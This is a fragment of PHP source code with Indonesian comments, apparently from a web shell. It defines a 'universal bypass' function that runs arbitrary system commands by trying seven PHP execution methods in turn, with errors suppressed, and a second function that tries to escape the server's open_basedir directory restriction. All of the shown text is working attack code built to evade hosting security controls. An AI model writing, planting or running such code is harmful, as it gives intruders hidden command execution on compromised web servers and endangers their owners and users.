    return $methods;
}

// UNIVERSAL BYPASS EXEC - Mencoba semua metode
function bypass_exec($cmd, $cwd = null) {
    if ($cwd) @chdir($cwd);
    
    // Method 1: shell_exec
    if (function_exists('shell_exec')) {
        $r = @shell_exec($cmd);
        if ($r !== null && $r !== '') return $r;
    }
    
    // Method 2: exec
    if (function_exists('exec')) {
        @exec($cmd, $out);
        if (!empty($out)) return implode("\n", $out);
    }
    
    // Method 3: system
    if (function_exists('system')) {
        ob_start();
        @system($cmd);
        $r = ob_get_clean();
        if ($r !== null && $r !== '') return $r;
    }
    
    // Method 4: passthru
    if (function_exists('passthru')) {
        ob_start();
        @passthru($cmd);
        $r = ob_get_clean();
        if ($r !== null && $r !== '') return $r;
    }
    
    // Method 5: popen
    if (function_exists('popen')) {
        $h = @popen($cmd, 'r');
        if ($h) {
            $r = '';
            while (!feof($h)) $r .= fread($h, 4096);
            pclose($h);
            if ($r !== '') return $r;
        }
    }
    
    // Method 6: proc_open
    if (function_exists('proc_open')) {
        $desc = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];
        $p = @proc_open($cmd, $desc, $pipes);
        if (is_resource($p)) {
            $r = stream_get_contents($pipes[1]);
            fclose($pipes[0]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($p);
            if ($r !== '') return $r;
        }
    }
    
    // Method 7: backtick operator
    $r = @`$cmd`;
    if ($r !== null && $r !== '') return $r;
    
    return "[!] All execution methods failed!";
}

// BYPASS open_basedir
function bypass_open_basedir() {
    $results = [];
    
    // Method 1: menggunakan glob wrapper
    $results['glob'] = @glob('/*/*');
    
    // Method 2: menggunakan realpath
    $results['realpath'] = @realpath('../');
    
    // Method 3: menggunakan ini_set (jika diizinkan)
    if (function_exists('ini_set')) {
        $old = @ini_get('open_basedir');
        @ini_set('open_basedir', '');
        $results['ini_set'] = @ini_get('open_basedir');
    }
    
    // Method 4: menggunakan DirectoryIterator
    try {
        $dir = new DirectoryIterator('/');
        $results['DirectoryIterator'] = 'Available';
    } catch (Exception $e) {
        $results['DirectoryIterator'] = 'Failed: ' . $e->getMessage();
    }
    
    return $results;
}

